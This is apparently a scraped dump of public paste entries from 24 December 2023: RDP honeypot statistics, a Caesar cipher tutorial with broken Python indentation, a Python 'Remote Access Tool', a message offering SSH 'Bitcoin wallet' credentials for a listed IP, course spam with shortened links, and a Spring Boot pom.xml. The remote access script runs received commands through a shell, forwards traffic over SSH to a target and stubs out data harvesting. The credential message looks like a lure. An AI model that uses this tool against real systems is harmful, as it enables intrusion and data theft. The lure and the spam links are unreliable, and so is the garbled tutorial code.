id,title,username,language,date,content
XKs5RGZw,2023-12-24_stats.json,rdp_snitch,JSON,Sunday 24th of December 2023 06:16:06 PM CDT,"{
  ""ip"": {
    ""103.68.109.207"": 2,
    ""176.49.8.97"": 2,
    ""196.190.117.7"": 6,
    ""45.134.224.88"": 2,
    ""167.94.138.34"": 2,
    ""45.227.254.49"": 4,
    ""87.251.75.145"": 6,
    ""167.248.133.53"": 2,
    ""198.235.24.80"": 6,
    ""130.162.52.206"": 4,
    ""187.191.115.110"": 2,
    ""122.3.71.174"": 4,
    ""103.20.102.235"": 2,
    ""38.55.31.99"": 2,
    ""185.170.144.3"": 4,
    ""205.164.28.218"": 6,
    ""194.165.16.73"": 4,
    ""110.86.3.66"": 2,
    ""198.235.24.247"": 6,
    ""39.165.211.116"": 2,
    ""185.170.144.113"": 18,
    ""34.83.54.70"": 2,
    ""31.43.185.3"": 4,
    ""43.154.91.97"": 2,
    ""41.32.181.37"": 12,
    ""179.60.147.51"": 2,
    ""222.252.27.66"": 2,
    ""43.134.235.36"": 2,
    ""118.193.33.16"": 2,
    ""167.94.138.33"": 2,
    ""103.167.92.115"": 8,
    ""198.235.24.129"": 6,
    ""45.227.254.54"": 4,
    ""185.222.243.154"": 2,
    ""87.251.75.64"": 2,
    ""62.204.41.208"": 8,
    ""69.164.216.196"": 18,
    ""185.161.248.148"": 2,
    ""205.210.31.243"": 6
  },
  ""asn"": {
    ""AS136557"": 2,
    ""AS12389"": 2,
    ""AS24757"": 6,
    ""AS147049"": 2,
    ""AS398324"": 6,
    ""AS267784"": 8,
    ""AS208091"": 8,
    ""AS396982"": 26,
    ""AS31898"": 4,
    ""AS262545"": 2,
    ""AS9299"": 4,
    ""AS140817"": 2,
    ""AS8796"": 2,
    ""AS197414"": 22,
    ""AS149440"": 6,
    ""AS48721"": 4,
    ""AS4134"": 2,
    ""AS24445"": 2,
    ""AS211736"": 4,
    ""AS132203"": 4,
    ""AS8452"": 12,
    ""AS209588"": 2,
    ""AS45899"": 2,
    ""AS135377"": 2,
    ""AS63737"": 8,
    ""AS136787"": 2,
    ""AS59425"": 8,
    ""AS63949"": 18,
    ""AS49202"": 2
  },
  ""isp"": {
    ""Zappie Host LLC"": 2,
    ""OJSC \""Sibirtelecom\"""": 2,
    ""Ethiotelecom"": 6,
    ""PacketHub S.A."": 2,
    ""Censys, Inc."": 6,
    ""Flyservers S.A."": 14,
    ""Xhost Internet Solutions LP"": 30,
    ""Google LLC"": 26,
    ""Oracle Corporation"": 4,
    ""Mandic S.A."": 2,
    ""Philippine Long Distance Telephone Co."": 4,
    ""ODS ONLINE DATA SOLUTION JOINT STOCK COMPANY"": 2,
    ""Cogent Communications"": 2,
    ""EGIHosting"": 6,
    ""Chinanet"": 2,
    ""China Mobile"": 2,
    ""FOP Dmytro Nedilskyi"": 4,
    ""Shenzhen Tencent Computer Systems Company Limited"": 2,
    ""TE Data"": 12,
    ""VietNam Post and Telecom Corporation"": 2,
    ""Aceville Pte.ltd"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Vietserver Services Technology Company Limited"": 8,
    ""Tefincom S.A."": 2,
    ""Horizon LLC"": 8,
    ""Akamai Technologies, Inc."": 18,
    ""Kisara LLC"": 2
  },
  ""org"": {
    ""Unknown"": 22,
    ""OJSC Sibirtelecom"": 2,
    ""Packethub S.A"": 4,
    ""Censys, Inc"": 4,
    ""UAB Host Baltic"": 8,
    ""Xhost Internet Solutions"": 8,
    ""Censys, Inc."": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Oracle Cloud Infrastructure (eu-frankfurt-1)"": 4,
    ""Mandic S.A"": 2,
    ""Philippine Long Distance Telephone Company"": 4,
    ""Thai AN Khang Communication Services Co., LTD"": 2,
    ""Kurun Cloud Inc"": 2,
    ""Xhostis"": 22,
    ""Evoxt"": 6,
    ""Flyservers S.A"": 4,
    ""Chinanet FJ"": 2,
    ""China Mobile"": 2,
    ""Google Cloud (us-west1)"": 2,
    ""FOP Dmytro Nedilskyi"": 4,
    ""Tencent Cloud Computing"": 2,
    ""Cloud Solutions S.A"": 2,
    ""Hanoi Post and Telecom Company"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Vnnetwork Network Solution Company Limited"": 8,
    ""Horizon LLC"": 8,
    ""Linode"": 18,
    ""Kisara LLC"": 2
  },
  ""regionName"": {
    ""North West"": 2,
    ""Krasnoyarsk Krai"": 2,
    ""Addis Ababa"": 6,
    ""Missouri"": 2,
    ""Michigan"": 6,
    ""Vilnius"": 8,
    ""North Holland"": 30,
    ""California"": 32,
    ""Hesse"": 4,
    ""Sao Paulo"": 2,
    ""Metro Manila"": 4,
    ""Ho Chi Minh"": 2,
    ""Kaunas"": 4,
    ""Fujian"": 2,
    ""Henan"": 2,
    ""Oregon"": 2,
    ""Dnipropetrovsk Oblast"": 4,
    ""Central and Western District"": 4,
    ""Giza"": 12,
    ""Distrito Federal"": 2,
    ""Hanoi"": 10,
    ""Central Singapore"": 2,
    ""Texas"": 2,
    ""Moscow"": 10,
    ""New Jersey"": 18
  },
  ""country"": {
    ""Singapore"": 4,
    ""Russia"": 12,
    ""Ethiopia"": 6,
    ""United States"": 62,
    ""Lithuania"": 12,
    ""The Netherlands"": 30,
    ""Germany"": 4,
    ""Brazil"": 2,
    ""Philippines"": 4,
    ""Vietnam"": 12,
    ""China"": 4,
    ""Ukraine"": 4,
    ""Hong Kong"": 4,
    ""Egypt"": 12,
    ""Venezuela"": 2
  },
  ""account"": {
    ""hello"": 70,
    ""Test"": 18,
    ""(empty)"": 14,
    ""Administr"": 20,
    ""AxoNtbGqJ"": 2,
    ""XXRFxa"": 2,
    ""ATuwEb"": 2,
    ""AseOUBrAg"": 2,
    ""BwaTXa"": 2,
    ""WhdhnM"": 2,
    ""Domain"": 26,
    ""Administrator"": 2,
    ""PiBJfzEKs"": 2,
    ""rYqnJO"": 2,
    ""uaylBf"": 2,
    ""CqkWlPYTu"": 2,
    ""SirJmH"": 2,
    ""FvpLSD"": 2
  },
  ""keyboard"": {
    ""Unknown"": 174
  },
  ""client_build"": {
    ""Unknown"": 174
  },
  ""client_name"": {
    ""Unknown"": 174
  },
  ""ip_type"": {
    ""hosting"": 56,
    ""Unknown"": 108,
    ""proxy"": 4,
    ""mobile"": 4,
    ""hosting & proxy"": 2
  }
}"
j5qQhFkR,2023-12-24_stats.json,rdp_snitch,JSON,Sunday 24th of December 2023 06:15:08 PM CDT,"{
  ""ip"": {
    ""103.68.109.207"": 1,
    ""176.49.8.97"": 1,
    ""196.190.117.7"": 3,
    ""45.134.224.88"": 1,
    ""167.94.138.34"": 1,
    ""45.227.254.49"": 2,
    ""87.251.75.145"": 3,
    ""167.248.133.53"": 1,
    ""198.235.24.80"": 3,
    ""130.162.52.206"": 2,
    ""187.191.115.110"": 1,
    ""122.3.71.174"": 2,
    ""103.20.102.235"": 1,
    ""38.55.31.99"": 1,
    ""185.170.144.3"": 2,
    ""205.164.28.218"": 3,
    ""194.165.16.73"": 2,
    ""110.86.3.66"": 1,
    ""198.235.24.247"": 3,
    ""39.165.211.116"": 1,
    ""185.170.144.113"": 9,
    ""34.83.54.70"": 1,
    ""31.43.185.3"": 2,
    ""43.154.91.97"": 1,
    ""41.32.181.37"": 6,
    ""179.60.147.51"": 1,
    ""222.252.27.66"": 1,
    ""43.134.235.36"": 1,
    ""118.193.33.16"": 1,
    ""167.94.138.33"": 1,
    ""103.167.92.115"": 4,
    ""198.235.24.129"": 3,
    ""45.227.254.54"": 2,
    ""185.222.243.154"": 1,
    ""87.251.75.64"": 1,
    ""62.204.41.208"": 4,
    ""69.164.216.196"": 9,
    ""185.161.248.148"": 1,
    ""205.210.31.243"": 3
  },
  ""asn"": {
    ""AS136557"": 1,
    ""AS12389"": 1,
    ""AS24757"": 3,
    ""AS147049"": 1,
    ""AS398324"": 3,
    ""AS267784"": 4,
    ""AS208091"": 4,
    ""AS396982"": 13,
    ""AS31898"": 2,
    ""AS262545"": 1,
    ""AS9299"": 2,
    ""AS140817"": 1,
    ""AS8796"": 1,
    ""AS197414"": 11,
    ""AS149440"": 3,
    ""AS48721"": 2,
    ""AS4134"": 1,
    ""AS24445"": 1,
    ""AS211736"": 2,
    ""AS132203"": 2,
    ""AS8452"": 6,
    ""AS209588"": 1,
    ""AS45899"": 1,
    ""AS135377"": 1,
    ""AS63737"": 4,
    ""AS136787"": 1,
    ""AS59425"": 4,
    ""AS63949"": 9,
    ""AS49202"": 1
  },
  ""isp"": {
    ""Zappie Host LLC"": 1,
    ""OJSC \""Sibirtelecom\"""": 1,
    ""Ethiotelecom"": 3,
    ""PacketHub S.A."": 1,
    ""Censys, Inc."": 3,
    ""Flyservers S.A."": 7,
    ""Xhost Internet Solutions LP"": 15,
    ""Google LLC"": 13,
    ""Oracle Corporation"": 2,
    ""Mandic S.A."": 1,
    ""Philippine Long Distance Telephone Co."": 2,
    ""ODS ONLINE DATA SOLUTION JOINT STOCK COMPANY"": 1,
    ""Cogent Communications"": 1,
    ""EGIHosting"": 3,
    ""Chinanet"": 1,
    ""China Mobile"": 1,
    ""FOP Dmytro Nedilskyi"": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1,
    ""TE Data"": 6,
    ""VietNam Post and Telecom Corporation"": 1,
    ""Aceville Pte.ltd"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Vietserver Services Technology Company Limited"": 4,
    ""Tefincom S.A."": 1,
    ""Horizon LLC"": 4,
    ""Akamai Technologies, Inc."": 9,
    ""Kisara LLC"": 1
  },
  ""org"": {
    ""Unknown"": 11,
    ""OJSC Sibirtelecom"": 1,
    ""Packethub S.A"": 2,
    ""Censys, Inc"": 2,
    ""UAB Host Baltic"": 4,
    ""Xhost Internet Solutions"": 4,
    ""Censys, Inc."": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Oracle Cloud Infrastructure (eu-frankfurt-1)"": 2,
    ""Mandic S.A"": 1,
    ""Philippine Long Distance Telephone Company"": 2,
    ""Thai AN Khang Communication Services Co., LTD"": 1,
    ""Kurun Cloud Inc"": 1,
    ""Xhostis"": 11,
    ""Evoxt"": 3,
    ""Flyservers S.A"": 2,
    ""Chinanet FJ"": 1,
    ""China Mobile"": 1,
    ""Google Cloud (us-west1)"": 1,
    ""FOP Dmytro Nedilskyi"": 2,
    ""Tencent Cloud Computing"": 1,
    ""Cloud Solutions S.A"": 1,
    ""Hanoi Post and Telecom Company"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Vnnetwork Network Solution Company Limited"": 4,
    ""Horizon LLC"": 4,
    ""Linode"": 9,
    ""Kisara LLC"": 1
  },
  ""regionName"": {
    ""North West"": 1,
    ""Krasnoyarsk Krai"": 1,
    ""Addis Ababa"": 3,
    ""Missouri"": 1,
    ""Michigan"": 3,
    ""Vilnius"": 4,
    ""North Holland"": 15,
    ""California"": 16,
    ""Hesse"": 2,
    ""Sao Paulo"": 1,
    ""Metro Manila"": 2,
    ""Ho Chi Minh"": 1,
    ""Kaunas"": 2,
    ""Fujian"": 1,
    ""Henan"": 1,
    ""Oregon"": 1,
    ""Dnipropetrovsk Oblast"": 2,
    ""Central and Western District"": 2,
    ""Giza"": 6,
    ""Distrito Federal"": 1,
    ""Hanoi"": 5,
    ""Central Singapore"": 1,
    ""Texas"": 1,
    ""Moscow"": 5,
    ""New Jersey"": 9
  },
  ""country"": {
    ""Singapore"": 2,
    ""Russia"": 6,
    ""Ethiopia"": 3,
    ""United States"": 31,
    ""Lithuania"": 6,
    ""The Netherlands"": 15,
    ""Germany"": 2,
    ""Brazil"": 1,
    ""Philippines"": 2,
    ""Vietnam"": 6,
    ""China"": 2,
    ""Ukraine"": 2,
    ""Hong Kong"": 2,
    ""Egypt"": 6,
    ""Venezuela"": 1
  },
  ""account"": {
    ""hello"": 35,
    ""Test"": 9,
    ""(empty)"": 7,
    ""Administr"": 10,
    ""AxoNtbGqJ"": 1,
    ""XXRFxa"": 1,
    ""ATuwEb"": 1,
    ""AseOUBrAg"": 1,
    ""BwaTXa"": 1,
    ""WhdhnM"": 1,
    ""Domain"": 13,
    ""Administrator"": 1,
    ""PiBJfzEKs"": 1,
    ""rYqnJO"": 1,
    ""uaylBf"": 1,
    ""CqkWlPYTu"": 1,
    ""SirJmH"": 1,
    ""FvpLSD"": 1
  },
  ""keyboard"": {
    ""Unknown"": 87
  },
  ""client_build"": {
    ""Unknown"": 87
  },
  ""client_name"": {
    ""Unknown"": 87
  },
  ""ip_type"": {
    ""hosting"": 28,
    ""Unknown"": 54,
    ""proxy"": 2,
    ""mobile"": 2,
    ""hosting & proxy"": 1
  }
}"
GpEjXbxr,"Julius Ceasar, Presents Basic Encryption",xGHOSTSECx,HTML,Sunday 24th of December 2023 05:49:10 PM CDT,"#   Mastering the Caesar Cipher Encryption
#   Presented by GhostSec
#   Chapter 1: Introduction
#   Welcome to this comprehensive tutorial on the Caesar Cipher encryption method, presented by GhostSec. In this tutorial, we will delve deeply into the Caesar Cipher to provide you with a thorough understanding of this ancient yet foundational encryption technique.
#   Section 1.1: Understanding the Caesar Cipher
#   Our journey begins with an exploration of the Caesar Cipher—an encryption method historically attributed to Julius Caesar. This method involves a straightforward concept: shifting letters in the alphabet forward or backward by a fixed number known as the ""key."" Let's begin by understanding the significance of the Caesar Cipher and its relevance in the modern age of cryptography.
#   Julius Caesar, the famed Roman military general, is believed to have used the Caesar Cipher for confidential communication. By shifting letters in his messages with a predefined key, he effectively maintained secrecy. Learning about this historical context not only adds depth to your understanding but also highlights the enduring importance of this cipher in the world of encryption.
#   Section 1.2: Modern Relevance
#   Despite its age, the Caesar Cipher remains a fundamental element of modern encryption. Proficiency in its principles is essential for a profound understanding of contemporary cryptography. This tutorial aims to provide you with the knowledge and skills needed to navigate the world of encryption with confidence.
#   Chapter 2: Creating Your Caesar Cipher Tool
#   In this chapter, we'll take a hands-on approach to creating your Caesar Cipher tool using the Python programming language. By the end of this section, you will be equipped with the practical knowledge to apply this ancient encryption method.
#   Section 2.1: Python Function Details
#   To effectively build your Caesar Cipher tool, it's crucial to understand the inner workings of the Python functions involved. We will provide detailed explanations of key components, such as ASCII conversions, case handling, and the modulo operation.
#   Let's break down the essential components of our Caesar Cipher Python function:
python
def caesar_cipher(message, key):
encrypted_message = """"
for char in message:
if char.isalpha():
is_upper = char.isupper()
char = char.lower()
encrypted_char = chr(((ord(char) - ord('a') + key) % 26) + ord('a'))
if is_upper:
encrypted_char = encrypted_char.upper()
encrypted_message += encrypted_char
else :
encrypted_message += char
return encrypted_message
#   1. The `caesar_cipher` function takes two arguments: `message` (the text to be encrypted) and `key` (the number of positions to shift the letters).
#   2. We initialize an empty string `encrypted_message` to store the resulting encrypted text.
#   3. We iterate through each character in the `message`.
#   4. For each character, we check if it's an alphabet character using `char.isalpha()`. If it is, we proceed with the encryption.
#   5. We handle the case of the character (uppercase or lowercase) to ensure it retains its original case after encryption.
#   6. The core of the Caesar Cipher logic happens within the `encrypted_char` calculation, where we shift the character by the key using ASCII values and the modulo operation. This ensures the shift wraps around the alphabet.
#   7. The encrypted character is appended to the `encrypted_message`.
#   8. If the character is not an alphabet character, it is added as is to the `encrypted_message`.
#   9. Finally, the function returns the `encrypted_message`.
#   This function is the heart of your Caesar Cipher tool, and understanding its components is crucial for applying the encryption technique.
#   Section 2.2: Building Your Python Function
#   Now, let's dive into the core of your Caesar Cipher tool. We will walk you through the creation of a Python function responsible for implementing the Caesar Cipher. This step-by-step breakdown will ensure that you grasp each part of the code, enhancing your understanding of how this encryption technique works.
#   Step 1: Initialize Variables**
python
def caesar_cipher(message, key):
encrypted_message = """"
#   We begin by defining the 'caesar_cipher' function and initializing an empty string, `encrypted_message`, which will store our encrypted text.
#   Step 2: Iterate Through the Message**
python
for char in message:
#   We use a `for` loop to iterate through each character in the `message`.
#   Step 3: Check if Character is an Alphabet Character
python
if char.isalpha():
#   Within the loop, we check if the character is an alphabet character using the `char.isalpha()` method.
#   Step 4: Handle Uppercase and Lowercase Characters**
python
is_upper = char.isupper()
char = char.lower()
#   We determine whether the character is originally in uppercase and convert it to lowercase for the encryption process. This step ensures that the case is preserved in the final result.
#   Step 5: Perform Caesar Cipher Encryption
python
encrypted_char = chr(((ord(char) - ord('a') + key) % 26) + ord('a'))
#   This is the core of the Caesar Cipher logic. We calculate the new character after applying the key.
#   `ord(char)` returns the ASCII value of the lowercase character `char`.
#   We subtract `ord('a')` to ensure that 'a' corresponds to 0 in our calculation.
#   The result of the calculation is shifted by the key and wrapped within the range of 26 characters using the modulo operation.
encrypted_char = chr(((ord(char) - ord('a') + key
    #   The result of the calculation is shifted by the key and wrapped within the range of 26 characters using the modulo operation.
    #   We add `ord('a')` to ensure that the result corresponds to a lowercase character in the alphabet.
    #   Step 6: Preserve Original Case and Build Encrypted Message
    python
    if is_upper:
    encrypted_char = encrypted_char.upper()
    #   We check if the original character was in uppercase. If so, we convert the encrypted character to uppercase.
    #   We then append the encrypted character to the `encrypted_message`.
    #   Step 7: Handle Non-Alphabet Characters
    python
    else :
    encrypted_message += char
    #   If the character is not an alphabet character, we simply add it to the `encrypted_message` without any changes.
    #   Step 8: Return the Encrypted Message
    python
    return encrypted_message
    #   Finally, we return the `encrypted_message` as the result of the encryption.
    #   This function is the heart of your Caesar Cipher tool, and understanding its components is crucial for applying the encryption technique.
    #   Chapter 3: Encryption and Decryption
    #   In this chapter, we will practically apply the Caesar Cipher tool you've created. You'll learn not only how to encrypt messages but also how to decrypt them, emphasizing the importance of key management.
    #   Section 3.1: Key Management
    #   Key confidentiality is paramount when it comes to message security. In history, Julius Caesar shared the key only with trusted individuals to safeguard his communications. We will explore best practices for managing keys securely and highlight the critical role they play in keeping your messages confidential.
    #   Section 3.2: Practical Application
    #   We'll guide you through a real-world example, demonstrating the process of encrypting a message using your Caesar Cipher tool. Additionally, you will learn how to decrypt messages by applying a negative key to reveal the original content. This hands-on experience will solidify your understanding of the encryption and decryption processes.
    #   Chapter 4: Advanced Concepts and Security Measures
    #   To deepen your grasp of the Caesar Cipher and strengthen your encryption skills, we'll explore advanced concepts and security measures in this chapter.
    #   Section 4.1: Brute Force Attack
    #   One vulnerability of the Caesar Cipher is its susceptibility to brute force attacks. Attackers can attempt to decrypt messages by trying all possible keys. We will discuss strategies to counter this vulnerability, such as using longer keys or shifting the entire alphabet to make decryption more challenging for potential attackers.
    #   A brute force attack involves trying every possible key to decrypt a message encrypted with the Caesar Cipher. Given that there are only 25 possible keys (as shifting by 26 is equivalent to no shift), it is relatively easy to brute force the Caesar Cipher. To counter this vulnerability, you can use longer keys, making the number of possible keys significantly larger, or shift the entire alphabet, which increases the complexity of decryption.
    #   Section 4.2: The Key as the Weak Point
    #   The security of the Caesar Cipher depends heavily on the secrecy of the key. In the modern context, effective key management is crucial. We'll guide you on the importance of not sharing keys openly and using secure methods for key exchange.
    #   In the context of the Caesar Cipher, the key is the most critical element. If an unauthorized party gains access to the key, they can easily decrypt the message. Therefore, it is essential to keep the key confidential and share it only with trusted individuals when necessary. In modern encryption, secure key exchange methods, such as using public-key cryptography, are employed to ensure key secrecy.
    #   Section 4.3: Frequency Analysis
    #   Frequency analysis is a technique used to crack simple ciphers, including the Caesar Cipher. It relies on the fact that some letters occur more frequently in the language. To mitigate this vulnerability, we will discuss strategies such as randomizing the alphabet or using more complex ciphers.
    #   Frequency analysis takes advantage of the fact that certain letters occur more frequently in most languages. In English, for example, the letter 'E' is the most common. By analyzing the frequency of letters in a ciphertext, an attacker can make educated guesses about the key. To mitigate this vulnerability, you can randomize the alphabet by using a random order of letters or employ more complex ciphers that do not rely on simple letter substitution.
    #   Chapter 5: Conclusion
    #   Congratulations on mastering the Caesar Cipher, a captivating encryption technique. While you've gained a strong foundation in encryption, remember that the world of cryptography is continually evolving. Your understanding of the Caesar Cipher will serve as a solid base for exploring more advanced encryption methods and contributing to the security of data and communication in an interconnected world.
    #   To continue your journey in the world of encryption, we provide references to additional resources, including articles and links to explore advanced encryption methods, cryptographic libraries, encryption best practices, and real-world applications. By delving deeper into the field of encryption, you can play a vital role in ensuring data and communication security in our increasingly digital world."
b6pVUm6C,Remote Access Tool,xGHOSTSECx,Python,Sunday 24th of December 2023 05:40:04 PM CDT,"import socket
import subprocess
import paramiko
import threading
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
def establish_connection(host, port, key):
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((host, port))
server_socket.listen(1)
client_socket, _ = server_socket.accept()
shared_key = derive_shared_key(client_socket, key)
return client_socket, shared_key
def derive_shared_key(client_socket, password):
salt = client_socket.recv(16)
kdf = PBKDF2HMAC(
    algorithm = hashes.SHA256(),
    iterations = 100000,
    salt = salt,
    length = 32,
    backend = default_backend()
)
key = kdf.derive(password.encode())
return key
def encrypt(data, key):
cipher = Cipher(algorithms.AES(key), modes.CFB(b'\0' * 16), backend = default_backend())
encryptor = cipher.encryptor()
encrypted_data = encryptor.update(data.encode()) + encryptor.finalize()
return encrypted_data
def decrypt(encrypted_data, key):
cipher = Cipher(algorithms.AES(key), modes.CFB(b'\0' * 16), backend = default_backend())
decryptor = cipher.decryptor()
decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
return decrypted_data.decode()
def send_command(client_socket, command, key):
encrypted_command = encrypt(command, key)
client_socket.send(encrypted_command)
def receive_output(client_socket, key):
encrypted_response = client_socket.recv(4096)
response = decrypt(encrypted_response, key)
return response
def close_connection(client_socket):
client_socket.close()
def execute_command(command):
try:
output = subprocess.check_output(command, shell = True, stderr = subprocess.STDOUT, universal_newlines = True)
except subprocess.CalledProcessError as e:
output = f""Error: {
    e.output
}""
return output
def forward_data(client_socket, remote_socket):
while True:
data = client_socket.recv(4096)
remote_socket.send(data)
response = remote_socket.recv(4096)
client_socket.send(response)
def start_ssh_forwarder(local_host, local_port, remote_host, remote_port, username, password):
forwarder_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
forwarder_socket.bind((local_host, local_port))
forwarder_socket.listen(1)
client_socket, _ = forwarder_socket.accept()
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(remote_host, port = 22, username = username, password = password)
remote_socket = ssh.invoke_shell()
return client_socket, remote_socket
def handle_target_client(client_socket, key):
command = receive_command(client_socket, key)
if command.startswith(""advanced_command""):
result = handle_advanced_logic(command)
elif command.startswith(""harvest_data""):
result = harvest_device_data()
else :
result = execute_command(command)
send_output(client_socket, result, key)
def handle_advanced_logic(command):
# Implement advanced logic based on the received command
result = ""Result of the advanced logic""
return result
def harvest_device_data():
# Implement data harvesting logic
data = ""All data harvested from the device""
return data
def receive_command(client_socket, key):
encrypted_command = client_socket.recv(4096)
command = decrypt(encrypted_command, key)
return command
def send_output(client_socket, output, key):
encrypted_output = encrypt(output, key)
client_socket.send(encrypted_output)
if __name__ == '__main__':
password = ""your_super_secret_password""
client_socket, shared_key = establish_connection(""127.0.0.1"", 8000, password)
send_command(client_socket, ""COMMAND_TO_SEND"", shared_key)
response = receive_output(client_socket, shared_key)
close_connection(client_socket)
client_socket, remote_socket = start_ssh_forwarder(""127.0.0.1"", 9000, ""TARGET_IP"", 8000, ""your_username"", ""your_password"")
threading.Thread(target = forward_data, args = (client_socket, remote_socket)).start()
client_socket = establish_connection(""TARGET_IP"", 8000, password)
handle_target_client(client_socket, shared_key)
close_connection(client_socket)"
kKnQZRNn,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Sunday 24th of December 2023 05:09:34 PM CDT,"Dear Moe,
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-249931"
wvQ7XmuE,Untitled,sissou123,C++,Sunday 24th of December 2023 04:44:24 PM CDT,"Design Patterns in Modern C++
Discover the modern implementation of design patterns with С++
This course provides a comprehensive overview of Design Patterns in Modern C++ from a practical perspective. This course in particular covers patterns with the use of:

The latest versions of the C++ programming language 
for more:https://dz-linkk.com/4cKofU

"
kuAmkntD,Untitled,sissou123,C++,Sunday 24th of December 2023 04:39:10 PM CDT,"Learn C++ Programming -Beginner to Advance- Deep Dive in C++
Classroom and Hands-on sessions- Features of C++ 11 , Exception Handling and STL - for Both Academics and Industry 
for more:https://dz-linkk.com/BXjXp
"
HWYQR8Rw,Untitled,sissou123,C++,Sunday 24th of December 2023 04:33:37 PM CDT,"The C++20 Masterclass : From Fundamentals to Advanced
Learn and Master Modern C++ From Beginning to Advanced in Plain English : C++11, C++14, C++17, C++20 and More! 
for more:https://cuty.io/ngup6Pe
"
vt3rxxKJ,Pom.xml Springboot 3 Security 6,xXGoziXx,XML,Sunday 24th of December 2023 02:54:41 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<project xmlns=""http://maven.apache.org/POM/4.0.0""
	xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
	xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		 <version>3.1.0</version>
		<relativePath /> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.smarthealthcare</groupId>
	<artifactId>Smart-Healthcare</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>Smart-Healthcare</name>
	<description>Smart Healthcare project for Spring Boot (Rest Api)</description>
	<properties>
		<java.version>17</java.version>
	</properties>
	<dependencies>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-aop</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-data-jpa</artifactId>
		</dependency>
		 <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-oauth2-resource-server</artifactId>
    </dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>
<!-- https://mvnrepository.com/artifact/org.modelmapper/modelmapper -->
    <dependency>
        <groupId>org.modelmapper</groupId>
        <artifactId>modelmapper</artifactId>
        <version>3.1.1</version>
    </dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>
		  <dependency>
        <groupId>com.mysql</groupId>
        <artifactId>mysql-connector-j</artifactId>
        <scope>runtime</scope>
    </dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.apache.logging.log4j</groupId>
			<artifactId>log4j-api</artifactId>
			<version>2.19.0</version>
		</dependency>
		<dependency>
			<groupId>org.apache.logging.log4j</groupId>
			<artifactId>log4j-core</artifactId>
			<version>2.19.0</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-security</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.security</groupId>
			<artifactId>spring-security-config</artifactId>
			<!-- <scope>test</scope> -->
		</dependency>
		<dependency>
			<groupId>io.jsonwebtoken</groupId>
			<artifactId>jjwt</artifactId>
			<version>0.9.1</version>
		</dependency>
		<dependency>
			<groupId>org.projectlombok</groupId>
			<artifactId>lombok</artifactId>
			<optional>true</optional>
		</dependency>
		<dependency>
			<groupId>io.springfox</groupId>
			<artifactId>springfox-swagger2</artifactId>
			<version>2.7.0</version>
		</dependency>

		<dependency>
			<groupId>io.springfox</groupId>
			<artifactId>springfox-swagger-ui</artifactId>
			<version>2.7.0</version>
		</dependency>
		 <!-- https://mvnrepository.com/artifact/io.jsonwebtoken/jjwt-api -->
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-api</artifactId>
        <version>0.11.5</version>
    </dependency>
	<!-- https://mvnrepository.com/artifact/io.jsonwebtoken/jjwt-impl -->
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-impl</artifactId>
        <version>0.11.5</version>
    </dependency>
	    <!-- https://mvnrepository.com/artifact/io.jsonwebtoken/jjwt-jackson -->
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-jackson</artifactId>
        <version>0.11.5</version>
    </dependency>
	</dependencies>

	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
			</plugin>
			<plugin>
				<groupId>com.github.eirslett</groupId>
				<artifactId>frontend-maven-plugin</artifactId>
				<version>1.6</version>
				<configuration>
					<workingDirectory>src/main/frontend</workingDirectory>
					<installDirectory>target</installDirectory>
				</configuration>
				<executions>
					<execution>
						<id>install node and npm</id>
						<goals>
							<goal>install-node-and-npm</goal>
						</goals>
						<configuration>
							<nodeVersion>v20.5.1</nodeVersion>
							<npmVersion>10.2.4</npmVersion>
						</configuration>
					</execution>
					<execution>
						<id>npm install</id>
						<goals>
							<goal>npm</goal>
						</goals>
						<configuration>
							<arguments>install</arguments>
						</configuration>
					</execution>
				</executions>
			</plugin>
		</plugins>
	</build>
</project>"
Rae6urRZ,Untitled,sissou123,Python,Sunday 24th of December 2023 02:27:20 PM CDT,"Python for Machine Learning & Data Science Masterclass
